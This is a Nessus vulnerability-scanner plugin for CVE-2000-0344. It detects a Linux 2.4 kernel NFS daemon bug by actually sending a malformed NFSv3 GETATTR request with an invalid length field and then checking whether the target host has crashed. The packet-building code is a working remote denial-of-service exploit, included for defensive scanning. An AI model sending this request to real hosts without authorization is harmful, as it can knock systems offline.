#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11813);
 script_bugtraq_id(1160, 8298);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2000-0344");
 name["english"] = "Linux 2.4 NFSv3 DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote host is running knfsd, a kernel NFS daemon.

There is a bug in this version which may allow an attacker to 
disable the remote host by sending a malformed GETATTR request
with an invalid length field.

An attacker may exploit this flaw to prevent this host from working
correctly.

Solution : Upgrade to the latest version of Linux 2.4, or do not use knfsd.
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "checks the presence of a DoS in the remote knfsd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}


include("misc_func.inc");
include("nfs_func.inc");

function dos(soc)
{
 local_var req, ret, i;
 

 
 pad = padsz(len:strlen(this_host_name()));
  len = 20 + strlen(this_host_name()) + pad;
 req =  	   rpclong(val:rand()) +
  		   rpclong(val:0) +
		   rpclong(val:2) +
		   rpclong(val:100003) +
		   rpclong(val:3) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:len) +
		   rpclong(val:rand()) +
		   rpclong(val:strlen(this_host_name())) +
		   this_host_name() +
		   rpcpad(pad:pad) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +	
		   rpclong(val:0)  +	
		   rpclong(val:0)  +	
		   rpclong(val:0)  +
					
		   raw_string(0xFF, 0xFF, 0xFF, 0xFF);
       
   send(socket:soc, data:req);
   r = recv(socket:soc, length:8192);
   return(strlen(r));
}

start_denial();
port = get_rpc_port(program:100003, protocol:IPPROTO_UDP);
if ( ! port ) exit(0);
soc = open_priv_sock_udp(dport:port);
if ( ! soc ) exit(0);
result = dos(soc:soc);
if(!result)
{ 
 alive = end_denial();
 if(!alive)security_hole(port);
}
